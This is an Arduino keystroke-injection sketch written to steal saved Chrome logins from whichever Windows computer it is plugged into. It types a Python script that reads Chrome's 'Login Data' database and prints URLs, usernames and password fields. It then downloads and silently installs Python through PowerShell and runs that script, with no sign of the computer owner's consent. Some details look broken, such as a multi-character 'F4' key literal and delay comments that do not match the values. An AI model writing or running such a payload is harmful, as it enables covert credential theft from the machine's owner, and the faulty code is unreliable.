#include <Keyboard.h>

void setup() {

  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW) {
    while (1);
  }
  
  // Initialize the Keyboard
  Keyboard.begin();
  
  delay(500); // DELAY 500
  
  // ALT+F4
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('F4');
  delay(100);
  Keyboard.releaseAll();
  
  delay(500); // DELAY 500
  
  // GUI+R (Windows Key + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  
  delay(500); // Wait for the run dialog to appear
  
  // Open notepad
  Keyboard.print("notepad");
  Keyboard.press(KEY_RETURN); // Press Enter
  delay(100);
  Keyboard.releaseAll();
  
  delay(500); // Wait for Notepad to open
  
  // Type the Python script content into Notepad
  Keyboard.print("import os");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("import sqlite3");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("# Path to the Chrome password database");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("chrome_path = os.environ['LOCALAPPDATA'] + '\\Google\\Chrome\\User Data\\Default\\'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("chrome_db = chrome_path + 'Login Data'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("print(\"Path to the Chrome password database:\", chrome_db)");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("# Open the Chrome password database");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("conn = sqlite3.connect(chrome_db)");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("cursor = conn.cursor()");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("print(\"Opened the Chrome password database\")");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("# Query the passwords table");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("cursor.execute('SELECT origin_url, username_value, password_value FROM logins')");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("print(\"Executed the SQL query\")");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("# Print out the extracted passwords");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("for row in cursor.fetchall():");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("    print('URL:', row[0])");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("    print('Username:', row[1])");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("    print('Password:', row[2])");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("    print('')");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("# Close the database connection");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("conn.close()");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("print(\"Closed the database connection\")");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
  delay(500); // Wait for the script to be written
  
  // Save the file as get_chrome_passwords.py
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(500); // Wait for Save As dialog to open
  
  // Type the filename
  Keyboard.print("get_chrome_passwords.py");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  
  delay(1000); // Wait for the file to save
  
  // Close Notepad
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('F4');
  delay(100);
  Keyboard.releaseAll();
  
  delay(500); // DELAY 500
  
  // GUI+R (Windows Key + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  
  delay(500); // Wait for the run dialog to appear
  
  // Type the command to download the Python installer
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.print("powershell -Command \"Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.9.2/python-3.9.2-amd64.exe' -OutFile 'python-installer.exe'\"");
  Keyboard.press(KEY_RETURN); // Press Enter
  delay(100);
  Keyboard.releaseAll();
  
  delay(300000); // Wait for the command prompt to process the command
  
  // Type the command to run the Python installer silently
  Keyboard.print("python-installer.exe /quiet AddPythonToEnvironment=1 InstallLaunchFolder=0 PrependPath=1 Include_test=0");
  Keyboard.press(KEY_RETURN); // Press Enter
  delay(100);
  Keyboard.releaseAll();
  
  delay(300000); // DELAY 5000 to wait for the installation to complete
  
  // Type the command to execute the script that gets Chrome passwords
  Keyboard.print("python get_chrome_passwords.py");
  Keyboard.press(KEY_RETURN); // Press Enter
  delay(100);
  Keyboard.releaseAll();
}

void loop() {
  // Do nothing here as this script only needs to be ran once
}
